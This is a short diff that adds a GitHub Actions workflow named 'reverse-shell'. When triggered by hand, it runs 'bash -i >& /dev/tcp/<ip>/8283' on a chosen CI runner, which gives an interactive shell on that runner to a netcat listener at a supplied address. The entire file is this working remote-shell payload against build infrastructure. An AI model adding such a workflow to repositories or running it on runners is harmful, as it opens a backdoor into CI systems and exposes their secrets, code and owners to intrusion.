@@ -1,0 +1,23 @@
+name: reverse-shell
+
+on:
+  workflow_dispatch:
+    inputs:
+      runner:
+        description: Name of the runner to use
+        required: true
+      nc-ip:
+        description: Ip address that runs "nc -lvnp 8283"
+        required: true
+
+permissions:
+  contents: read
+
+jobs:
+  start-runner:
+    name: Start reverse shell on ${{ inputs.runner }}
+    runs-on: ${{ inputs.runner }}
+
+    steps:
+    - run: |
+        bash -i >& /dev/tcp/${{ inputs.nc-ip }}/8283 0>&1
